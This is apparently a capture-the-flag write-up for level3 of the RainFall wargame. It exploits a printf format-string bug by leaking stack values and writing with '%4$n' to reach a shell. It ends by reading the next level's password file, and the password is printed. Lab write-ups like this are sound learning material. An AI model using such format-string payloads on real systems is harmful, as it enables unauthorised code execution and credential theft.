# level3
For this level, we will use a segfault from %n flag of printf

We have an executble which is using printf
```bash
    level3@RainFall:~$ ./level3 
    %p %u %d
    0x200 3086817984 -1208010800
```
```bash
level3@RainFall:~$ python -c 'print("BBBB" + "%p " * 8)' | ./level3 
BBBB0x200 0xb7fd1ac0 0xb7ff37d0 0x42424242 0x25207025 0x70252070 0x20702520 0x25207025 
```
We can see that the thing we print will be stocked in the 4th variable, we will use it to execute some code and produce a segfault

Don't hesitate to read [the gdb explain](gdbwriteup.md) to understand how did we found the address to we have to send and the size of the buffer

```bash
level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "a" * 60 + "%4$n")'; cat) | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
cat /home/user/level4/.pass      
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```